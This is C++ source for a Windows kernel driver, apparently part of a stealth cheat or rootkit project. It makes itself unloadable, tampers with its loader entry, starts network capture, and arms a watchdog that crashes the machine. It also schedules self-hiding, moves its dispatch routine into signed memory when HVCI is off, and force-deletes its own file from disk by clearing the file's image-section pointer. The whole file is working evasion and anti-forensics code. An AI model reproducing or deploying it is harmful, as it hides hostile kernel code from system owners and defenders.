#include <ntifs.h>
#include <Crypter.h>
#include <imports/Defs.h>
#include <function/Dispatcher.h>
#include <function/Stealth.h>
#include <function/CoreSecurity.h>
#include <function/AntiDebug.h>
#include <function/SentinelBridge.h>

namespace net_capture {
    NTSTATUS initialize(PDEVICE_OBJECT devObj);
    void cleanup();
}

constexpr ULONG TAG_DEL = 'leDW';


#ifndef FILE_DISPOSITION_FLAG_DELETE
#define FILE_DISPOSITION_FLAG_DELETE                 0x00000001
#endif
#ifndef FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
#define FILE_DISPOSITION_FLAG_POSIX_SEMANTICS       0x00000002
#endif
#ifndef FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE
#define FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE 0x00000010
#endif


static constexpr FILE_INFORMATION_CLASS FileDispositionInformationExClass =
    static_cast<FILE_INFORMATION_CLASS>(64);

static BOOLEAN ForceDeleteFileByPath(PUNICODE_STRING FilePath)
{
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][ForceDelete] >>> Entry: FilePath=%p\n", FilePath);

    if (!FilePath) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][ForceDelete] ABORT: FilePath is NULL\n");
        return FALSE;
    }
    if (!FilePath->Buffer) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][ForceDelete] ABORT: FilePath->Buffer is NULL\n");
        return FALSE;
    }
    if (!_ZwSetInformationFile) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][ForceDelete] ABORT: _ZwSetInformationFile is NULL (import not resolved)\n");
        return FALSE;
    }

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][ForceDelete] Target path: %wZ (Len=%u MaxLen=%u)\n",
        FilePath, FilePath->Length, FilePath->MaximumLength);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][ForceDelete] Function pointer audit: "
        "_IoCreateFileEx=%p _ZwDeleteFile=%p _ZwClose=%p _ZwSetInformationFile=%p\n",
        _IoCreateFileEx, _ZwDeleteFile, _ZwClose, _ZwSetInformationFile);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, FilePath,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);


    {
        HANDLE clearHandle = NULL;
        IO_STATUS_BLOCK clearIosb = {};
        NTSTATUS clearStatus = ZwCreateFile(
            &clearHandle,
            FILE_READ_ATTRIBUTES | SYNCHRONIZE,
            &objAttr,
            &clearIosb,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0
        );

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][PreStep] ZwCreateFile(READ_ATTRIBUTES) returned 0x%08X, "
            "handle=%p ioStatus=0x%08X\n",
            clearStatus, clearHandle, clearIosb.Status);

        if (NT_SUCCESS(clearStatus) && clearHandle) {
            PFILE_OBJECT fileObj = NULL;

            clearStatus = ObReferenceObjectByHandle(
                clearHandle,
                0,
                *IoFileObjectType,
                KernelMode,
                reinterpret_cast<PVOID*>(&fileObj),
                NULL
            );

            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[DEL][PreStep] ObReferenceObjectByHandle returned 0x%08X, fileObj=%p\n",
                clearStatus, fileObj);

            if (NT_SUCCESS(clearStatus) && fileObj) {
                PSECTION_OBJECT_POINTERS sop = fileObj->SectionObjectPointer;

                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                    "[DEL][PreStep] SectionObjectPointers=%p\n", sop);

                if (sop) {
                    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                        "[DEL][PreStep] Before clear: DataSectionObject=%p "
                        "SharedCacheMap=%p ImageSectionObject=%p\n",
                        sop->DataSectionObject,
                        sop->SharedCacheMap,
                        sop->ImageSectionObject);


                    sop->ImageSectionObject = NULL;

                    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                        "[DEL][PreStep] ImageSectionObject cleared to NULL — "
                        "delete disposition checks will now pass\n");
                } else {
                    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                        "[DEL][PreStep] SectionObjectPointers is NULL — "
                        "nothing to clear (file may already be deletable)\n");
                }

                ObDereferenceObject(fileObj);
            } else {
                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                    "[DEL][PreStep] ObReferenceObjectByHandle FAILED 0x%08X — "
                    "ImageSectionObject NOT cleared, all delete tiers will likely "
                    "still return STATUS_CANNOT_DELETE\n",
                    clearStatus);
            }

            _ZwClose(clearHandle);
        } else {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[DEL][PreStep] ZwCreateFile FAILED 0x%08X — "
                "ImageSectionObject NOT cleared, all delete tiers will likely "
                "still return STATUS_CANNOT_DELETE\n",
                clearStatus);
        }
    }


    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][Tier0] Checking _IoCreateFileEx availability: %s\n",
        _IoCreateFileEx ? "AVAILABLE" : "NULL - will skip Tier 0");

    if (_IoCreateFileEx) {
        HANDLE fileHandle = NULL;
        IO_STATUS_BLOCK ioStatus = {};
        IO_DRIVER_CREATE_CONTEXT createCtx = {};
        createCtx.Size = sizeof(createCtx);

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][Tier0] Calling IoCreateFileEx with "
            "ACCESS=(DELETE|SYNCHRONIZE|FILE_WRITE_ATTRIBUTES) "
            "SHARE=(R|W|D) OPEN_FLAGS=(NON_DIR|SYNC_IO) IO_IGNORE_SHARE_ACCESS_CHECK\n");

        NTSTATUS status = _IoCreateFileEx(
            &fileHandle,
            DELETE | SYNCHRONIZE | FILE_WRITE_ATTRIBUTES,
            &objAttr,
            &ioStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0,
            CreateFileTypeNone,
            NULL,
            IO_IGNORE_SHARE_ACCESS_CHECK,
            &createCtx
        );

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][Tier0] IoCreateFileEx returned 0x%08X, fileHandle=%p, "
            "ioStatus.Status=0x%08X ioStatus.Info=%llu\n",
            status, fileHandle, ioStatus.Status, (ULONG64)ioStatus.Information);

        if (NT_SUCCESS(status)) {
            struct {
                ULONG Flags;
            } dispEx = {};

            dispEx.Flags = FILE_DISPOSITION_FLAG_DELETE
                         | FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
                         | FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE;

            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[DEL][Tier0] Calling ZwSetInformationFile(FileDispositionInformationEx=64) "
                "Flags=0x%08X (DELETE|POSIX_SEMANTICS|IGNORE_READONLY)\n", dispEx.Flags);

            status = _ZwSetInformationFile(
                fileHandle, &ioStatus,
                &dispEx, sizeof(dispEx),
                FileDispositionInformationExClass
            );

            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[DEL][Tier0] ZwSetInformationFile(POSIX) returned 0x%08X, "
                "ioStatus.Status=0x%08X\n", status, ioStatus.Status);

            _ZwClose(fileHandle);

            if (NT_SUCCESS(status)) {
                DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                    "[DEL][Tier0] SUCCESS — POSIX unlink scheduled, returning TRUE\n");
                return TRUE;
            }

            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[DEL][Tier0] FAILED (0x%08X), falling through to Tier 1\n", status);
        }
        else {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[DEL][Tier0] IoCreateFileEx FAILED (0x%08X), skipping POSIX delete\n", status);
        }
    }


    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][Tier1] Checking _ZwDeleteFile availability: %s\n",
        _ZwDeleteFile ? "AVAILABLE" : "NULL - will skip Tier 1");

    if (_ZwDeleteFile) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][Tier1] Calling ZwDeleteFile directly...\n");
        NTSTATUS st = _ZwDeleteFile(&objAttr);
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][Tier1] ZwDeleteFile returned 0x%08X\n", st);
        if (NT_SUCCESS(st)) {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[DEL][Tier1] SUCCESS, returning TRUE\n");
            return TRUE;
        }
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][Tier1] FAILED (0x%08X), falling through to Tier 2\n", st);
    }


    HANDLE fileHandle = NULL;
    IO_STATUS_BLOCK ioStatus = {};
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][Tier2] Checking _IoCreateFileEx availability: %s\n",
        _IoCreateFileEx ? "AVAILABLE" : "NULL - will skip Tier 2");

    if (_IoCreateFileEx) {
        IO_DRIVER_CREATE_CONTEXT createCtx = {};
        createCtx.Size = sizeof(createCtx);

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][Tier2] Calling IoCreateFileEx with FILE_DELETE_ON_CLOSE | IO_IGNORE_SHARE_ACCESS_CHECK...\n");

        status = _IoCreateFileEx(
            &fileHandle,
            DELETE | SYNCHRONIZE,
            &objAttr,
            &ioStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE,
            NULL, 0,
            CreateFileTypeNone,
            NULL,
            IO_IGNORE_SHARE_ACCESS_CHECK,
            &createCtx
        );

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][Tier2] IoCreateFileEx(DELETE_ON_CLOSE) returned 0x%08X, "
            "fileHandle=%p, ioStatus.Status=0x%08X\n",
            status, fileHandle, ioStatus.Status);

        if (NT_SUCCESS(status)) {

            _ZwClose(fileHandle);
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
                "[DEL][Tier2] SUCCESS — handle closed with DELETE_ON_CLOSE, returning TRUE\n");
            return TRUE;
        }

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][Tier2] FAILED (0x%08X), falling through to Tier 3\n", status);
    }


    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][Tier3] Attempting standard ZwCreateFile (no IO_IGNORE_SHARE_ACCESS_CHECK)...\n");

    fileHandle = NULL;
    RtlZeroMemory(&ioStatus, sizeof(ioStatus));
    status = ZwCreateFile(
        &fileHandle,
        DELETE | SYNCHRONIZE,
        &objAttr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_DELETE,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL, 0
    );

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][Tier3] ZwCreateFile returned 0x%08X, fileHandle=%p, ioStatus.Status=0x%08X\n",
        status, fileHandle, ioStatus.Status);

    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][Tier3] ZwCreateFile FAILED (0x%08X) — all tiers exhausted, returning FALSE\n",
            status);
        return FALSE;
    }


    struct {
        BOOLEAN DeleteFile;
    } dispInfo = { TRUE };

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][Tier3] Calling ZwSetInformationFile(FileDispositionInformation=13) DeleteFile=TRUE...\n");

    status = _ZwSetInformationFile(
        fileHandle, &ioStatus,
        &dispInfo, sizeof(dispInfo),
        (FILE_INFORMATION_CLASS)13
    );

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][Tier3] ZwSetInformationFile(class=13) returned 0x%08X, ioStatus.Status=0x%08X\n",
        status, ioStatus.Status);

    _ZwClose(fileHandle);

    if (NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][Tier3] SUCCESS — disposition set, returning TRUE\n");
    } else {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][Tier3] FAILED (0x%08X) — all fallback tiers exhausted, returning FALSE\n", status);
    }

    return NT_SUCCESS(status);
}

static VOID DeleteDriverOnDisk(PUNICODE_STRING RegistryPath)
{
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][DeleteDriverOnDisk] >>> Entry: RegistryPath=%p\n", RegistryPath);

    if (!RegistryPath || !RegistryPath->Buffer) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] ABORT: RegistryPath or Buffer is NULL\n");
        return;
    }

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][DeleteDriverOnDisk] RegistryPath=%wZ\n", RegistryPath);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][DeleteDriverOnDisk] Import audit: _ZwOpenKey=%p _ZwQueryValueKey=%p _ZwClose=%p\n",
        _ZwOpenKey, _ZwQueryValueKey, _ZwClose);

    if (!_ZwOpenKey || !_ZwQueryValueKey || !_ZwClose) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] ABORT: one or more required imports are NULL\n");
        return;
    }

    OBJECT_ATTRIBUTES keyAttr;
    InitializeObjectAttributes(&keyAttr, RegistryPath,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE keyHandle = NULL;
    NTSTATUS status = _ZwOpenKey(&keyHandle, KEY_READ, &keyAttr);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][DeleteDriverOnDisk] ZwOpenKey(RegistryPath) returned 0x%08X, keyHandle=%p\n",
        status, keyHandle);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] ABORT: could not open registry key\n");
        return;
    }

    UNICODE_STRING valueName;
    _RtlInitUnicodeString(&valueName, L"ImagePath");

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][DeleteDriverOnDisk] Querying ImagePath size...\n");

    ULONG kvSize = 0;
    status = _ZwQueryValueKey(keyHandle, &valueName,
        KeyValuePartialInformation, NULL, 0, &kvSize);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][DeleteDriverOnDisk] ZwQueryValueKey(size probe) returned 0x%08X, "
        "requiredSize=%u (expected STATUS_BUFFER_TOO_SMALL=0x%08X or OVERFLOW=0x%08X)\n",
        status, kvSize, STATUS_BUFFER_TOO_SMALL, STATUS_BUFFER_OVERFLOW);

    if (status != STATUS_BUFFER_TOO_SMALL && status != STATUS_BUFFER_OVERFLOW) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] ABORT: unexpected status from size probe, "
            "ImagePath may not exist in this key\n");
        _ZwClose(keyHandle);
        return;
    }

#pragma warning(push)
#pragma warning(disable: 4996)


    auto kvInfo = static_cast<PKEY_VALUE_PARTIAL_INFORMATION>(
        ExAllocatePoolWithTag(NonPagedPool, kvSize, TAG_DEL));
#pragma warning(pop)

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][DeleteDriverOnDisk] ExAllocatePoolWithTag(%u bytes) returned %p\n",
        kvSize, kvInfo);

    if (!kvInfo) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] ABORT: pool allocation failed\n");
        _ZwClose(keyHandle);
        return;
    }

    status = _ZwQueryValueKey(keyHandle, &valueName,
        KeyValuePartialInformation, kvInfo, kvSize, &kvSize);
    _ZwClose(keyHandle);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][DeleteDriverOnDisk] ZwQueryValueKey(data) returned 0x%08X, "
        "Type=%u DataLength=%u\n",
        status, kvInfo->Type, kvInfo->DataLength);

    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] ABORT: ZwQueryValueKey(data) failed 0x%08X\n", status);
        ExFreePoolWithTag(kvInfo, TAG_DEL);
        return;
    }

    if (kvInfo->Type != REG_SZ && kvInfo->Type != REG_EXPAND_SZ) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] ABORT: ImagePath has unexpected registry type %u "
            "(expected REG_SZ=%u or REG_EXPAND_SZ=%u)\n",
            kvInfo->Type, REG_SZ, REG_EXPAND_SZ);
        ExFreePoolWithTag(kvInfo, TAG_DEL);
        return;
    }


    ULONG dataLen = kvInfo->DataLength;
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][DeleteDriverOnDisk] dataLen=%u (must be >= %llu for at least one WCHAR)\n",
        dataLen, (ULONG64)sizeof(WCHAR));

    if (dataLen >= sizeof(WCHAR)) {
        PWCHAR imgBuf = (PWCHAR)kvInfo->Data;
        ULONG chars = dataLen / sizeof(WCHAR);

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] raw chars=%u, last char=0x%04X (%s null terminator)\n",
            chars, (ULONG)imgBuf[chars - 1],
            imgBuf[chars - 1] == L'\0' ? "IS" : "NOT");

        if (imgBuf[chars - 1] == L'\0') {
            chars--;
        }

        UNICODE_STRING imagePath;
        imagePath.Buffer = imgBuf;
        imagePath.Length = (USHORT)(chars * sizeof(WCHAR));
        imagePath.MaximumLength = (USHORT)dataLen;

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] Constructed NT path: %wZ (Length=%u MaxLength=%u)\n",
            &imagePath, imagePath.Length, imagePath.MaximumLength);

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] >>> Calling ForceDeleteFileByPath...\n");

        BOOLEAN ok = ForceDeleteFileByPath(&imagePath);

        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] <<< ForceDeleteFileByPath returned: %s\n",
            ok ? "TRUE (SUCCESS)" : "FALSE (FAILED)");
    } else {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
            "[DEL][DeleteDriverOnDisk] ABORT: dataLen=%u is too small to contain a valid path\n",
            dataLen);
    }

    ExFreePoolWithTag(kvInfo, TAG_DEL);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,
        "[DEL][DeleteDriverOnDisk] <<< Exit\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {

    if (!SetupFunctions()) {
        return STATUS_UNSUCCESSFUL;
    }

    if (!device_names::initialize_names()) {
        return STATUS_UNSUCCESSFUL;
    }

    UNICODE_STRING deviceName = {};
    _RtlInitUnicodeString(&deviceName, device_names::get_device_name());

    PDEVICE_OBJECT deviceObject = nullptr;

    NTSTATUS status = _IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &deviceObject
    );

    if (!NT_SUCCESS(status)) {
        return status;
    }

    UNICODE_STRING symLink = {};
    _RtlInitUnicodeString(&symLink, device_names::get_symlink_name());

    _IoDeleteSymbolicLink(&symLink);

    status = _IoCreateSymbolicLink(&symLink, &deviceName);
    if (!NT_SUCCESS(status)) {
        _IoDeleteDevice(deviceObject);
        return status;
    }

    SetFlag(deviceObject->Flags, DO_BUFFERED_IO);

    DriverObject->MajorFunction[IRP_MJ_CREATE]         = dispatcher::Pilot;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = dispatcher::Pilot;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatcher::Controller;

    DriverObject->DriverUnload = nullptr;

    if (DriverObject->DriverSection) {
        auto ldrEntry = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
        ldrEntry->Flags |= 0x20u;
    }

    ClearFlag(deviceObject->Flags, DO_DEVICE_INITIALIZING);

    status = net_capture::initialize(deviceObject);
    if (!NT_SUCCESS(status)) {
        _IoDeleteSymbolicLink(&symLink);
        _IoDeleteDevice(deviceObject);
        return status;
    }


    if (DriverObject->DriverSection) {
        auto ldr = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
        PVOID base = ldr->DllBase;
        if (base && _MmIsAddressValid(base)) {
            PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(base);
            if (dos->e_magic == IMAGE_DOS_SIGNATURE) {
                PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
                    static_cast<UCHAR*>(base) + dos->e_lfanew);
                if (_MmIsAddressValid(nt) && nt->Signature == IMAGE_NT_SIGNATURE) {
                    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
                    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                        if (sec[i].Name[0] == '.' && sec[i].Name[1] == 't' &&
                            sec[i].Name[2] == 'e' && sec[i].Name[3] == 'x' &&
                            sec[i].Name[4] == 't') {
                            sentinel_bridge::init(
                                static_cast<UCHAR*>(base) + sec[i].VirtualAddress,
                                sec[i].Misc.VirtualSize);
                            break;
                        }
                    }
                }
            }
        }
    }

    // Start the reverse-watchdog: a periodic DPC that verifies Sentinel
    // is still alive by monitoring its TSC heartbeat in the shared bridge.
    // BSODs after 30 s of silence (following a 90 s grace period).
    sentinel_bridge::start_watchdog();

    stealth::ScheduleDelayedHide(DriverObject);

    if (!hvci_detect::is_hvci_enabled()) {
        signed_memory::RelocateDispatchToSignedMemory(DriverObject, 0x800);
    }


    DeleteDriverOnDisk(RegistryPath);

    return STATUS_SUCCESS;
}
